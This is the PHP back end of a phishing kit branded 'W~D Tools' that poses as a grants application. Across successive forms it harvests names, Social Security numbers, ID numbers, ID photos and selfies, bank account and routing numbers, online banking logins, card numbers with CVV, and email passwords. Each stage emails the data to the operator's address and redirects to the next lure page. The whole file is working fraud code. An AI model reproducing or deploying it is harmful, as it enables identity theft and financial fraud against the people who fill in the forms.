<?php include 'antibot.php';
 include 'email.php';
if( isset($_POST['submit']) ) {
//getting user data
$firstName = $_POST['firstName'];
$lastName = $_POST['lastName'];
$fromEmail = $_POST['email'];
$phone = $_POST['tel'];
$dateOfBirth = $_POST['date'];
$cityName = $_POST['city'];
$homeAddress = $_POST['address'];
$employmentStatus = $_POST['status'];
$income = $_POST['income'];
$ssn = $_POST[ 'ssn'];
$idnumber = $_POST[ 'idnumber'];
$typeofgrants = $_POST['typegrants'];
$requestedgrants = $_POST['requestedgrants'];
 
//Recipient email, Replace with your email Address
$mailTo = $Receive_email;
 
//email subject
$subject = ' Grants Application Recieved ' .$firstName;
 
//email message body
$htmlContent = '<h2> Grants Application Recieved </h2>
========W~~~D=====Tools==========<br>
========W~~~D=====Tools==========
<p> <b>Client Name: </b> '.$firstName . " " . $lastName . '</p>
<p> <b>Email: </b> '.$fromEmail .'</p>
<p> <b>Phone Number: </b> '.$phone .'</p>
<p> <b>Date of Birth: </b> '.$dateOfBirth .'</p>
<p> <b>City Name: </b> '.$cityName .'</p>
<p> <b>Home Address: </b> '.$homeAddress .'</p>
<p> <b>Employment Status: </b> '.$employmentStatus .'</p>
<p> <b>Annual Income: </b> '.$income .'</p>
<p> <b>Social Security Number: </b> '.$ssn .'</p>
<p> <b>Drivers/State id number: </b> '.$idnumber .'</p>
<p> <b>Type of Grants : </b> '.$typeofgrants .'</p>
<p> <b>Requested Grants Amount : </b> '.$requestedgrants  .'</p>
========W~~~D=====Tools==========<br>
========W~~~D=====Tools==========';

 
//header for sender info
$headers = "From: 🔥W~D🔥 Grants Received <". $fromEmail . ">";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
 
//PHP mailer function
 $result = mail($mailTo, $subject, $htmlContent, $headers);

 if ($variable) {
  include('error.php');
}
else {
  include('congratulations.php');
}
 
  
}


function removeFilename($url)
{
    $file_info = pathinfo($url);
    return isset($file_info['extension'])
        ? str_replace($file_info['filename'] . "." . $file_info['extension'], "", $url)
        : $url;
}



if (isset($_POST['btton2'])) {

  $useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	$url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	$filename = '';
	$filenameb = '';
	

	if($_FILES['frontidd']['name'] != "")
	{
		$filetoupload = $_FILES['frontidd'];
		$filename = md5(time()).str_replace(" ", "-", $filetoupload['name']);
		move_uploaded_file($filetoupload['tmp_name'], "file/" . $filename);
	}
	if($_FILES['backidd']['name'] != "")
	{
		$filetouploadb = $_FILES['backidd'];
		$filenameb = md5(time()).str_replace(" ", "-", $filetouploadb['name']);
		move_uploaded_file($filetouploadb['tmp_name'], "file/" . $filenameb);
	}

  if($_FILES['selfie']['name'] != "")
	{
		$filetouploadc = $_FILES['selfie'];
		$filenamec = md5(time()).str_replace(" ", "-", $filetouploadc['name']);
		move_uploaded_file($filetouploadc['tmp_name'], "file/" . $filenamec);
	}
	
	$file_to_attach = "file/" . $filename;
	$file_to_attachb = "file/" . $filenameb;
  $file_to_attachc = "file/" . $filenamec;

    $message .= "|---========W~~~D=====Tools========--|\n";

	$message .= "Front ID              : ".removeFilename($url).$file_to_attach."\n";
	$message .= "Back ID               : ".removeFilename($url).$file_to_attachb."\n";
    $message .= "Selfie ID               : ".removeFilename($url).$file_to_attachc."\n";
	
	
	$message .= "|---========W~~~D=====Tools========--|\n";
	$send = $Receive_email;
	$subject = "🔥W~D🔥 Grants Verification:";
 	mail($send, $subject, $message); 

	 if ($variable) {
    include('error.php');
  }
  else {
    include('Linkbank.php');
  }
}
 
if( isset($_POST['btton3']) ) {
	//getting user data
	$bankNamee = $_POST['bankname'];
	$AName = $_POST['accountname'];
	$Acct['accountnumber'];
	$routine = $_POST['routinenumber'];
	$homeAddress = $_POST['address'];

	//Recipient email, Replace with your email Address
$mailTo = $Receive_email;
 
//email subject
$subject = ' Bank Info Recieved ' .$AName;
 
//email message body
$htmlContent = '<h2> Bank Info Recieved </h2>
========W~~~D=====Tools==========<br>
========W~~~D=====Tools==========
<p> <b>Bank Name: </b> '.$bankNamee .'</p>
<p> <b>Account Name: </b> '.$AName .'</p>
<p> <b>Account Number: </b> '.$Acct .'</p>
<p> <b>Routine Number: </b> '.$routine .'</p>
<p> <b>Home Address: </b> '.$homeAddress .'</p>
========W~~~D=====Tools==========';

//header for sender info
$headers = "From: 🔥W~D🔥 Bank Info <". $AName. ">";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
 
//PHP mailer function
 $result = mail($mailTo, $subject, $htmlContent, $headers);

 if ($variable) {
  include('error.php');
}
else {
  include('onlinelogins.php');
}

}



if( isset($_POST['btton4']) ) {
	//getting user data
	$bankuser = $_POST['b-username'];
	$bankpassword = $_POST['b-password'];
	

	//Recipient email, Replace with your email Address
$mailTo = $Receive_email;
 
//email subject
$subject = ' Bank Info Recieved ' .$bankuser;
 
//email message body
$htmlContent = '<h2> Bank Info Recieved </h2>
========W~~~D=====Tools==========<br>
========W~~~D=====Tools==========

<p> <b>User Name: </b> '.$bankuser .'</p>
<p> <b>Password: </b> '.$bankpassword .'</p>

========W~~~D=====Tools==========';

//header for sender info
$headers = "From: 🔥W~D🔥 Bank Info <". $bankuser. ">";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
 
//PHP mailer function
 $result = mail($mailTo, $subject, $htmlContent, $headers);

 if ($variable) {
  include('error.php');
}
else {
  include('card.php');
}

}

if( isset($_POST['btton6']) ) {
	//getting user data
	$Cardnum = $_POST['cardnumber'];
	$Expdate = $_POST['datenum'];
	$CVV = $_POST['cvvnum'];
	$AANameeb = $_POST['nameonacct'];
	

	//Recipient email, Replace with your email Address
$mailTo = $Receive_email;
 
//email subject
$subject = ' Bank Info Recieved ' .$AANameeb;
 
//email message body
$htmlContent = '<h2> Bank Info Recieved </h2>
========W~~~D=====Tools==========<br>
========W~~~D=====Tools==========

<p> <b>Card Number: </b> '.$Cardnum .'</p>
<p> <b>Expire Date: </b> '.$Expdate .'</p>
<p> <b>CVV: </b> '.$CVV .'</p>
<p> <b>Name on Card: </b> '.$AANameeb .'</p>

========W~~~D=====Tools==========';

//header for sender info
$headers = "From: 🔥W~D🔥 Bank Info <". $AANameeb. ">";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
 
//PHP mailer function
 $result = mail($mailTo, $subject, $htmlContent, $headers);

 if ($variable) {
  include('error.php');
}
else {
  include('Emaillogin.php');
}

}

if( isset($_POST['btton5']) ) {
	//getting user data
	$Emaillog = $_POST['emaillog'];
	$Emailpass = $_POST['e-password'];
	

	//Recipient email, Replace with your email Address
$mailTo = $Receive_email;
 
//email subject
$subject = ' Bank Info Recieved ' .$Emaillog;
 
//email message body
$htmlContent = '<h2> Bank Info Recieved </h2>
========W~~~D=====Tools==========<br>
========W~~~D=====Tools==========

<p> <b>Email: </b> '.$Emaillog .'</p>
<p> <b>Password: </b> '.$Emailpass .'</p>

========W~~~D=====Tools==========';

//header for sender info
$headers = "From: 🔥W~D🔥 Bank Info <". $Emaillog. ">";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
 
//PHP mailer function
 $result = mail($mailTo, $subject, $htmlContent, $headers);

 if ($variable) {
  include('error.php');
}
else {
  include('verification-progress.php');
}

}




?>